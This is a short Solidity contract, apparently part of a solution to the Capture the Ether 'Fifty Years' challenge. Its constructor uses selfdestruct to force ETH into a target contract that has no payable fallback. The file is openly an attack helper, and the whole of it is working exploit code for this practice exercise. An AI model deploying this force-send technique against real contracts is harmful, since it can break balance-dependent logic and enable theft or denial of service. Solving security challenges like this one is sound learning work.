// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.4.21;

/**
 * @title FiftyYearsAttacker
 * @dev This contract is designed to forcibly send ETH to another contract using selfdestruct.
 *      It is used to bypass standard transfer restrictions on contracts that do not have
 *      payable fallback or receive functions (e.g., the FiftyYearsChallenge contract).
 *
 *      In Solidity, selfdestruct(address) immediately transfers the contract’s balance
 *      to the specified address, regardless of whether the recipient has any payable functions.
 *
 *      Use case:
 *      - Contract under attack lacks payable fallback, so .send/.transfer will fail
 *      - This attacker is deployed with a small amount of ETH (e.g., 2 wei)
 *      - The constructor immediately selfdestructs, forcing the ETH to the target contract
 */
contract FiftyYearsAttacker {
    /**
     * @param target The address to which the contract's balance will be forcibly sent.
     * @notice When this contract is deployed, it immediately self-destructs
     *         and sends all attached ETH to the target address.
     */
    function FiftyYearsAttacker(address target) public payable {
        // Force-send ETH via selfdestruct (bypasses transfer restrictions)
        selfdestruct(target);
    }
}
